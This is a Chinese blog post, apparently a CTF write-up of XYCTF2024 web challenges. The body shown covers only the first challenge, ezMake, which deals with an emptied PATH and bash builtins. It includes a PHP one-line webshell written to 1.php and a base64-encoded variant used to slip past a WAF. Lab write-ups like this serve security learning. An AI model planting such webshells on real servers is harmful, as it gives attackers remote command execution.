<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="XYCTF2024复现">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF2024复现">
<meta property="og:url" content="https://wanth3f1ag.top/2025/07/16/XYCTF2024%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="XYCTF2024复现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402151235637.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402151459724.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402152913741.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402154804684.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402184608575.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402184557046.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402185222669.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402185609304.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402191734884.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402194903136.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402194428990.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250403162908127.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/ship.jpg">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/plane.jpg">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250403164408218.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250403171617983.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250403175559834.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250518215956707.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250518220028879.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250518221820810.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250519094207459.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250519094641413.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250519150052097.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250519151308336.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250716163058746.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250716164221945.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250716165717617.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250716172853056.png">
<meta property="article:published_time" content="2025-07-16T11:27:19.000Z">
<meta property="article:modified_time" content="2025-12-01T11:06:16.193Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="XYCTF2024">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/XYCTF2024/image-20250402151235637.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/07/16/XYCTF2024%E5%A4%8D%E7%8E%B0/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/07/16/XYCTF2024%E5%A4%8D%E7%8E%B0/","path":"2025/07/16/XYCTF2024复现/","title":"XYCTF2024复现"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>XYCTF2024复现 | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezMake"><span class="nav-number">1.</span> <span class="nav-text">ezMake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-Make"><span class="nav-number">2.</span> <span class="nav-text">ez?Make</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezhttp"><span class="nav-number">3.</span> <span class="nav-text">ezhttp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BC%AA%E9%80%A0"><span class="nav-number">3.1.</span> <span class="nav-text">#请求头伪造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezClass"><span class="nav-number">4.</span> <span class="nav-text">ezClass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error%E5%86%85%E7%BD%AE%E7%B1%BB%E5%AE%9E%E7%8E%B0RCE"><span class="nav-number">4.1.</span> <span class="nav-text">#Error内置类实现RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SplFileObject%E5%86%85%E7%BD%AE%E7%B1%BB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">4.2.</span> <span class="nav-text">#SplFileObject内置类+data伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezRCE"><span class="nav-number">5.</span> <span class="nav-text">ezRCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">5.1.</span> <span class="nav-text">#无字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warm-up"><span class="nav-number">6.</span> <span class="nav-text">warm up</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="nav-number">6.1.</span> <span class="nav-text">#PHP特性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezmd5"><span class="nav-number">7.</span> <span class="nav-text">ezmd5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E5%9B%BE%E7%89%87%E7%A2%B0%E6%92%9E"><span class="nav-number">7.1.</span> <span class="nav-text">#md5图片碰撞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7"><span class="nav-number">8.</span> <span class="nav-text">牢牢记住，逝者为大</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9Acp%E5%A4%8D%E5%88%B6flag"><span class="nav-number">8.1.</span> <span class="nav-text">方法1：cp复制flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">8.2.</span> <span class="nav-text">方法2：反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">8.3.</span> <span class="nav-text">方法3：数字编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%CE%B5Z-%C2%BF%D0%BC-K%CE%B5%C2%BF"><span class="nav-number">9.</span> <span class="nav-text">εZ?¿м@Kε¿?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="nav-number">9.1.</span> <span class="nav-text">重定向符&lt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">9.2.</span> <span class="nav-text">$(&lt;$&lt;)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88payload"><span class="nav-number">9.3.</span> <span class="nav-text">最终payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPOP"><span class="nav-number">10.</span> <span class="nav-text">ezPOP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GC%E5%9B%9E%E6%94%B6%E7%BB%95%E8%BF%87"><span class="nav-number">10.1.</span> <span class="nav-text">#GC回收绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="nav-number">11.</span> <span class="nav-text">我是一个复读机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI"><span class="nav-number">11.1.</span> <span class="nav-text">#SSTI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezSerialize"><span class="nav-number">12.</span> <span class="nav-text">ezSerialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">12.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E7%BB%95%E8%BF%87"><span class="nav-number">12.2.</span> <span class="nav-text">#指针绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">12.3.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84php"><span class="nav-number">12.4.</span> <span class="nav-text">#常规php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">12.5.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BBSplFileObject%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">12.6.</span> <span class="nav-text">#原生类SplFileObject读取文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezLFI"><span class="nav-number">13.</span> <span class="nav-text">ezLFI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#filter%E9%93%BERCE"><span class="nav-number">13.1.</span> <span class="nav-text">#filter链RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9E%E8%BF%9E%E7%9C%8B%E5%88%B0%E5%BA%95%E6%98%AF%E8%BF%9E%E8%BF%9E%E4%BB%80%E4%B9%88%E7%9C%8B"><span class="nav-number">14.</span> <span class="nav-text">连连看到底是连连什么看</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#give-me-flag"><span class="nav-number">15.</span> <span class="nav-text">give me flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-unserialize"><span class="nav-number">16.</span> <span class="nav-text">baby_unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login"><span class="nav-number">17.</span> <span class="nav-text">login</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">171</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">123</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/07/16/XYCTF2024%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="XYCTF2024复现 | root@wanth3f1ag">
      <meta itemprop="description" content="XYCTF2024复现">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          XYCTF2024复现
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-07-16 19:27:19" itemprop="dateCreated datePublished" datetime="2025-07-16T19:27:19+08:00">2025-07-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:06:16" itemprop="dateModified" datetime="2025-12-01T19:06:16+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>45k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>41 分钟</span>
    </span>
</div>

            <div class="post-description">XYCTF2024复现</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><p>扫了一下目录发现有flag文件，下载下来就是flag，不过好像这不是预期解</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402151235637.png" alt="image-20250402151235637"></p>
<p>传入一个1之后有回显</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402151459724.png" alt="image-20250402151459724"></p>
<p>分析一下内容</p>
<p>这里PATH变量被设置为空，这段 Makefile 的逻辑检查了 PATH 是否未定义，如果未定义则设为空，如果已定义也重设为空。因为**<code>make</code> 命令本身也依赖 PATH 查找**，当PATH被设置为空之后，</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402152913741.png" alt="image-20250402152913741"></p>
<p>但是测试之后发现Bash内置命令是可以执行的</p>
<ul>
<li>内置命令列表</li>
</ul>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">:</td>
<td align="left">扩展参数列表，执行重定向操作</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">读取并执行指定文件中的命令（在当前 shell 环境中）</td>
</tr>
<tr>
<td align="left">alias</td>
<td align="left">为指定命令定义一个别名</td>
</tr>
<tr>
<td align="left">bg</td>
<td align="left">将作业以后台模式运行</td>
</tr>
<tr>
<td align="left">bind</td>
<td align="left">将键盘序列绑定到一个 readline 函数或宏</td>
</tr>
<tr>
<td align="left">break</td>
<td align="left">退出 for、while、select 或 until 循环</td>
</tr>
<tr>
<td align="left">builtin</td>
<td align="left">执行指定的 shell 内建命令</td>
</tr>
<tr>
<td align="left">caller</td>
<td align="left">返回活动子函数调用的上下文</td>
</tr>
<tr>
<td align="left">cd</td>
<td align="left">将当前目录切换为指定的目录</td>
</tr>
<tr>
<td align="left">command</td>
<td align="left">执行指定的命令，无需进行通常的 shell 查找</td>
</tr>
<tr>
<td align="left">compgen</td>
<td align="left">为指定单词生成可能的补全匹配</td>
</tr>
<tr>
<td align="left">complete</td>
<td align="left">显示指定的单词是如何补全的</td>
</tr>
<tr>
<td align="left">compopt</td>
<td align="left">修改指定单词的补全选项</td>
</tr>
<tr>
<td align="left">continue</td>
<td align="left">继续执行 for、while、select 或 until 循环的下一次迭代</td>
</tr>
<tr>
<td align="left">declare</td>
<td align="left">声明一个变量或变量类型。</td>
</tr>
<tr>
<td align="left">dirs</td>
<td align="left">显示当前存储目录的列表</td>
</tr>
<tr>
<td align="left">disown</td>
<td align="left">从进程作业表中刪除指定的作业</td>
</tr>
<tr>
<td align="left">echo</td>
<td align="left">将指定字符串输出到 STDOUT</td>
</tr>
<tr>
<td align="left">enable</td>
<td align="left">启用或禁用指定的内建shell命令</td>
</tr>
<tr>
<td align="left">eval</td>
<td align="left">将指定的参数拼接成一个命令，然后执行该命令</td>
</tr>
<tr>
<td align="left">exec</td>
<td align="left">用指定命令替换 shell 进程</td>
</tr>
<tr>
<td align="left">exit</td>
<td align="left">强制 shell 以指定的退出状态码退出</td>
</tr>
<tr>
<td align="left">export</td>
<td align="left">设置子 shell 进程可用的变量</td>
</tr>
<tr>
<td align="left">fc</td>
<td align="left">从历史记录中选择命令列表</td>
</tr>
<tr>
<td align="left">fg</td>
<td align="left">将作业以前台模式运行</td>
</tr>
<tr>
<td align="left">getopts</td>
<td align="left">分析指定的位置参数</td>
</tr>
<tr>
<td align="left">hash</td>
<td align="left">查找并记住指定命令的全路径名</td>
</tr>
<tr>
<td align="left">help</td>
<td align="left">显示帮助文件</td>
</tr>
<tr>
<td align="left">history</td>
<td align="left">显示命令历史记录</td>
</tr>
<tr>
<td align="left">jobs</td>
<td align="left">列出活动作业</td>
</tr>
<tr>
<td align="left">kill</td>
<td align="left">向指定的进程 ID(PID) 发送一个系统信号</td>
</tr>
<tr>
<td align="left">let</td>
<td align="left">计算一个数学表达式中的每个参数</td>
</tr>
<tr>
<td align="left">local</td>
<td align="left">在函数中创建一个作用域受限的变量</td>
</tr>
<tr>
<td align="left">logout</td>
<td align="left">退出登录 shell</td>
</tr>
<tr>
<td align="left">mapfile</td>
<td align="left">从 STDIN 读取数据行，并将其加入索引数组</td>
</tr>
<tr>
<td align="left">popd</td>
<td align="left">从目录栈中删除记录</td>
</tr>
<tr>
<td align="left">printf</td>
<td align="left">使用格式化字符串显示文本</td>
</tr>
<tr>
<td align="left">pushd</td>
<td align="left">向目录栈添加一个目录</td>
</tr>
<tr>
<td align="left">pwd</td>
<td align="left">显示当前工作目录的路径名</td>
</tr>
<tr>
<td align="left">read</td>
<td align="left">从 STDIN 读取一行数据并将其赋给一个变量</td>
</tr>
<tr>
<td align="left">readarray</td>
<td align="left">从 STDIN 读取数据行并将其放入索引数组</td>
</tr>
<tr>
<td align="left">readonly</td>
<td align="left">从 STDIN 读取一行数据并将其赋给一个不可修改的变量</td>
</tr>
<tr>
<td align="left">return</td>
<td align="left">强制函数以某个值退出，这个值可以被调用脚本提取</td>
</tr>
<tr>
<td align="left">set</td>
<td align="left">设置并显示环境变量的值和 shell 属性</td>
</tr>
<tr>
<td align="left">shift</td>
<td align="left">将位置参数依次向下降一个位置</td>
</tr>
<tr>
<td align="left">shopt</td>
<td align="left">打开&#x2F;关闭控制 shell 可选行为的变量值</td>
</tr>
<tr>
<td align="left">source</td>
<td align="left">读取并执行指定文件中的命令（在当前 shell 环境中）</td>
</tr>
<tr>
<td align="left">suspend</td>
<td align="left">暂停 Shell 的执行，直到收到一个 SIGCONT 信号</td>
</tr>
<tr>
<td align="left">test</td>
<td align="left">基于指定条件返回退出状态码 0 或 1</td>
</tr>
<tr>
<td align="left">times</td>
<td align="left">显示累计的用户和系统时间</td>
</tr>
<tr>
<td align="left">trap</td>
<td align="left">如果收到了指定的系统信号，执行指定的命令</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">显示指定的单词如果作为命令将会如何被解释</td>
</tr>
<tr>
<td align="left">typeset</td>
<td align="left">声明一个变量或变量类型。</td>
</tr>
<tr>
<td align="left">ulimit</td>
<td align="left">为系统用户设置指定的资源的上限</td>
</tr>
<tr>
<td align="left">umask</td>
<td align="left">为新建的文件和目录设置默认权限</td>
</tr>
<tr>
<td align="left">unalias</td>
<td align="left">刪除指定的别名</td>
</tr>
<tr>
<td align="left">unset</td>
<td align="left">刪除指定的环境变量或 shell 属性</td>
</tr>
<tr>
<td align="left">wait</td>
<td align="left">等待指定的进程完成，并返回退出状态码</td>
</tr>
</tbody></table>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu<span class="variable">@VM</span><span class="number">-16</span><span class="number">-12</span>-<span class="symbol">ubuntu:</span>/<span class="variable">$ </span><span class="title class_">PATH</span>=</span><br><span class="line">ubuntu<span class="variable">@VM</span><span class="number">-16</span><span class="number">-12</span>-<span class="symbol">ubuntu:</span>/<span class="variable">$ </span>echo <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">ubuntu<span class="variable">@VM</span><span class="number">-16</span><span class="number">-12</span>-<span class="symbol">ubuntu:</span>/<span class="variable">$ </span>pwd</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>尝试用echo写木马但是遇到waf了</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><span class="language-xml">&quot; &gt; 1.php</span></span><br></pre></td></tr></table></figure>

<p>用base64和hex绕过也不行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&quot;</span> | <span class="built_in">base64</span> -d &gt; 1.php</span><br></pre></td></tr></table></figure>

<p>试一下用Bash里的.去执行flag文件就行</p>
